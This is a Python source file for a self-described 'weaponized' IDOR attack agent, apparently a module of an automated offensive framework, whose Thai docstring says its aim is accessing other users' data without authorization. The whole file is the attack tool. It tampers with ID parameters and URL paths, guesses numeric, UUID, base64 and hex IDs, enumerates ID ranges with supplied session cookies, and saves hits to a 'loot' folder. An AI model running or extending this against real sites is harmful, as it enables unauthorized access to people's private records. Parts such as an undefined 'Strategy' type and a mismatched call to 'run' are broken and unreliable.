"""
Enhanced IDOR (Insecure Direct Object Reference) Agent
โจมตีช่องโหว่ IDOR เพื่อเข้าถึงข้อมูลของผู้ใช้อื่นโดยไม่ได้รับอนุญาต - ฉบับ Weaponized
"""

import asyncio
import re
import hashlib
import os
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp
from bs4 import BeautifulSoup

from core.base_agent import BaseAgent
from core.data_models import AgentData, AttackPhase
from core.logger import log


class IDORAgent(BaseAgent):
    """
    Weaponized IDOR Agent
    
    Features:
    - Parameter manipulation (ID, user_id, doc_id, etc.)
    - Sequential ID enumeration
    - UUID/GUID prediction
    - Path traversal
    - Cookie/Token manipulation
    - Base64/Hex encoded IDs
    - Hash-based ID prediction
    - API endpoint testing
    - Mass data extraction
    """
    
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.EXPLOITATION]
    required_tools = []

    def __init__(self, context_manager=None, orchestrator=None, **kwargs):
        super().__init__(context_manager, orchestrator, **kwargs)
        workspace_dir = os.getenv("WORKSPACE_DIR", "workspace"); self.results_dir = os.path.join(workspace_dir, "loot", "idor")
        os.makedirs(self.results_dir, exist_ok=True)
        
        # IDOR parameters
        self.idor_parameters = [
            'id', 'user_id', 'userid', 'user', 'uid',
            'doc_id', 'document_id', 'file_id', 'fileid',
            'order_id', 'orderid', 'invoice_id', 'invoiceid',
            'account_id', 'accountid', 'profile_id', 'profileid',
            'post_id', 'postid', 'article_id', 'articleid',
            'page_id', 'pageid', 'item_id', 'itemid',
            'transaction_id', 'transactionid', 'payment_id', 'paymentid'
        ]
        
        # URL patterns
        self.idor_patterns = [
            r'/user/(\d+)',
            r'/profile/(\d+)',
            r'/document/(\d+)',
            r'/file/(\d+)',
            r'/order/(\d+)',
            r'/invoice/(\d+)',
            r'/api/v\d+/users/(\d+)',
            r'/api/v\d+/documents/(\d+)',
        ]

    async def run(self, directive: str, context: Dict[str, Any]) -> AgentData:
        """
        Main execution method
        
        Args:
            directive: "scan", "exploit", "enumerate"
            context: {
                "url": target URL,
                "parameter": parameter to test,
                "start_id": start ID for enumeration,
                "end_id": end ID for enumeration,
                "cookies": authentication cookies,
                "headers": custom headers
            }
        """
        log.info(f"[IDORAgent] Starting with directive: {directive}")
        
        url = context.get("url")
        if not url:
            return AgentData(
                agent_name="IDORAgent",
                success=False,
                data={"error": "No URL provided"}
            )

        try:
            if directive == "scan":
                result = await self._scan_for_idor(url, context)
            elif directive == "exploit":
                result = await self._exploit_idor(url, context)
            elif directive == "enumerate":
                result = await self._enumerate_ids(url, context)
            else:
                result = await self._scan_for_idor(url, context)
            
            return AgentData(
                agent_name="IDORAgent",
                success=result.get("success", False),
                data=result
            )
            
        except Exception as e:
            log.error(f"[IDORAgent] Error: {e}")
            return AgentData(
                agent_name="IDORAgent",
                success=False,
                data={"error": str(e)}
            )

    async def _scan_for_idor(self, url: str, context: Dict) -> Dict:
        """สแกนหา IDOR vulnerabilities"""
        log.info(f"[IDORAgent] Scanning {url} for IDOR...")
        
        vulnerabilities = []
        
        # Parse URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Check URL parameters
        for param_name in params.keys():
            if any(idor_param in param_name.lower() for idor_param in self.idor_parameters):
                log.info(f"[IDORAgent] Testing parameter: {param_name}")
                
                is_vulnerable = await self._test_parameter(url, param_name, params[param_name][0], context)
                
                if is_vulnerable:
                    vulnerabilities.append({
                        "type": "parameter_idor",
                        "parameter": param_name,
                        "original_value": params[param_name][0],
                        "url": url
                    })
        
        # Check URL path
        for pattern in self.idor_patterns:
            match = re.search(pattern, parsed.path)
            if match:
                original_id = match.group(1)
                log.info(f"[IDORAgent] Testing path ID: {original_id}")
                
                is_vulnerable = await self._test_path_id(url, pattern, original_id, context)
                
                if is_vulnerable:
                    vulnerabilities.append({
                        "type": "path_idor",
                        "pattern": pattern,
                        "original_id": original_id,
                        "url": url
                    })
        
        result = {
            "success": len(vulnerabilities) > 0,
            "url": url,
            "vulnerabilities": vulnerabilities,
            "output_file": self._save_results(url, "scan", vulnerabilities)
        }
        
        if vulnerabilities:
            log.success(f"[IDORAgent] Found {len(vulnerabilities)} IDOR vulnerabilities!")
        else:
            log.warning("[IDORAgent] No IDOR vulnerabilities found")
        
        return result

    async def _test_parameter(self, url: str, param_name: str, original_value: str, context: Dict) -> bool:
        """ทดสอบ parameter IDOR"""
        try:
            # Parse URL
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Get original response
            cookies = context.get("cookies", {})
            headers = context.get("headers", {})
            headers["User-Agent"] = "Mozilla/5.0"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(url, cookies=cookies, headers=headers, timeout=10) as response:
                    original_status = response.status
                    original_content = await response.text()
                    original_length = len(original_content)
                
                # Try different IDs
                test_values = self._generate_test_values(original_value)
                
                for test_value in test_values:
                    # Modify parameter
                    params[param_name] = [test_value]
                    test_url = urlunparse((
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        urlencode(params, doseq=True),
                        parsed.fragment
                    ))
                    
                    async with session.get(test_url, cookies=cookies, headers=headers, timeout=10) as response:
                        test_status = response.status
                        test_content = await response.text()
                        test_length = len(test_content)
                        
                        # Check if we got different data
                        if test_status == 200 and test_length > 0:
                            # Check if content is different (not error page)
                            if abs(test_length - original_length) > 100:  # Significant difference
                                if "error" not in test_content.lower() and "not found" not in test_content.lower():
                                    log.success(f"[IDORAgent] IDOR found! {param_name}={test_value}")
                                    return True
                    
                    await asyncio.sleep(0.1)  # Rate limiting
            
            return False
            
        except Exception as e:
            log.debug(f"[IDORAgent] Error testing parameter: {e}")
            return False

    async def _test_path_id(self, url: str, pattern: str, original_id: str, context: Dict) -> bool:
        """ทดสอบ path ID IDOR"""
        try:
            cookies = context.get("cookies", {})
            headers = context.get("headers", {})
            headers["User-Agent"] = "Mozilla/5.0"
            
            async with aiohttp.ClientSession() as session:
                # Get original response
                async with session.get(url, cookies=cookies, headers=headers, timeout=10) as response:
                    original_status = response.status
                    original_content = await response.text()
                    original_length = len(original_content)
                
                # Try different IDs
                test_ids = self._generate_test_values(original_id)
                
                for test_id in test_ids:
                    # Replace ID in URL
                    test_url = re.sub(pattern, lambda m: m.group(0).replace(original_id, test_id), url)
                    
                    async with session.get(test_url, cookies=cookies, headers=headers, timeout=10) as response:
                        test_status = response.status
                        test_content = await response.text()
                        test_length = len(test_content)
                        
                        # Check if we got different data
                        if test_status == 200 and test_length > 0:
                            if abs(test_length - original_length) > 100:
                                if "error" not in test_content.lower() and "not found" not in test_content.lower():
                                    log.success(f"[IDORAgent] IDOR found! ID={test_id}")
                                    return True
                    
                    await asyncio.sleep(0.1)
            
            return False
            
        except Exception as e:
            log.debug(f"[IDORAgent] Error testing path ID: {e}")
            return False

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute idor agent enhanced"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _generate_test_values(self, original_value: str) -> List[str]:
        """สร้างค่าทดสอบ"""
        test_values = []
        
        try:
            # Numeric IDs
            if original_value.isdigit():
                original_int = int(original_value)
                test_values.extend([
                    str(original_int - 1),
                    str(original_int + 1),
                    str(original_int - 10),
                    str(original_int + 10),
                    "1",
                    "2",
                    "100",
                    "1000"
                ])
            
            # UUID/GUID
            elif len(original_value) == 36 and '-' in original_value:
                # Try common UUIDs
                test_values.extend([
                    "00000000-0000-0000-0000-000000000001",
                    "00000000-0000-0000-0000-000000000002",
                    "11111111-1111-1111-1111-111111111111"
                ])
            
            # Base64 encoded
            elif len(original_value) % 4 == 0:
                try:
                    import base64
                    decoded = base64.b64decode(original_value).decode()
                    if decoded.isdigit():
                        # It's a base64 encoded number
                        test_ints = [int(decoded) - 1, int(decoded) + 1]
                        for test_int in test_ints:
                            test_values.append(base64.b64encode(str(test_int).encode()).decode())
                except Exception as e:
                    print("Error occurred")
            
            # Hex encoded
            elif all(c in '0123456789abcdefABCDEF' for c in original_value):
                try:
                    decoded_int = int(original_value, 16)
                    test_values.extend([
                        hex(decoded_int - 1)[2:],
                        hex(decoded_int + 1)[2:]
                    ])
                except Exception as e:
                    print("Error occurred")
        
        except Exception as e:
            log.debug(f"[IDORAgent] Error generating test values: {e}")
        
        return test_values[:10]  # Limit to 10 test values

    async def _exploit_idor(self, url: str, context: Dict) -> Dict:
        """Exploit IDOR vulnerability"""
        log.info(f"[IDORAgent] Exploiting IDOR...")
        
        # First scan
        scan_result = await self._scan_for_idor(url, context)
        
        if not scan_result.get("success"):
            return {
                "success": False,
                "message": "No IDOR vulnerability found"
            }
        
        # Extract data from vulnerable endpoints
        vulnerabilities = scan_result["vulnerabilities"]
        extracted_data = []
        
        for vuln in vulnerabilities:
            data = await self._extract_data(url, vuln, context)
            extracted_data.append(data)
        
        result = {
            "success": True,
            "vulnerabilities": vulnerabilities,
            "extracted_data": extracted_data,
            "output_file": self._save_results(url, "exploit", extracted_data)
        }
        
        log.success(f"[IDORAgent] Exploitation complete!")
        return result

    async def _extract_data(self, url: str, vuln: Dict, context: Dict) -> Dict:
        """ดึงข้อมูลจาก vulnerable endpoint"""
        # Implement data extraction logic
        return {
            "vulnerability": vuln,
            "data": "Data extraction not yet implemented"
        }

    async def _enumerate_ids(self, url: str, context: Dict) -> Dict:
        """Enumerate IDs"""
        log.info(f"[IDORAgent] Enumerating IDs...")
        
        start_id = context.get("start_id", 1)
        end_id = context.get("end_id", 100)
        
        found_ids = []
        
        for test_id in range(start_id, end_id + 1):
            # Test each ID
            is_valid = await self._test_id(url, test_id, context)
            
            if is_valid:
                found_ids.append(test_id)
                log.success(f"[IDORAgent] Found valid ID: {test_id}")
            
            await asyncio.sleep(0.1)
        
        result = {
            "success": len(found_ids) > 0,
            "start_id": start_id,
            "end_id": end_id,
            "found_ids": found_ids,
            "total_found": len(found_ids),
            "output_file": self._save_results(url, "enumerate", found_ids)
        }
        
        log.success(f"[IDORAgent] Found {len(found_ids)} valid IDs!")
        return result

    async def _test_id(self, url: str, test_id: int, context: Dict) -> bool:
        """ทดสอบ ID"""
        try:
            # Replace ID in URL
            test_url = re.sub(r'\d+', str(test_id), url, count=1)
            
            cookies = context.get("cookies", {})
            headers = context.get("headers", {})
            headers["User-Agent"] = "Mozilla/5.0"
            
            async with aiohttp.ClientSession() as session:
                async with session.get(test_url, cookies=cookies, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        content = await response.text()
                        if len(content) > 100 and "error" not in content.lower():
                            return True
            
            return False
            
        except Exception as e:
            return False

    def _save_results(self, url: str, operation: str, data: Any) -> str:
        """บันทึกผลลัพธ์"""
        url_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        filename = f"idor_{operation}_{url_hash}.txt"
        filepath = os.path.join(self.results_dir, filename)
        
        try:
            import json
            with open(filepath, 'w') as f:
                f.write(f"URL: {url}\n")
                f.write(f"Operation: {operation}\n")
                f.write("="*80 + "\n\n")
                f.write(json.dumps(data, indent=2))
            return filepath
        except Exception as e:
            log.error(f"[IDORAgent] Failed to save results: {e}")
            return ""

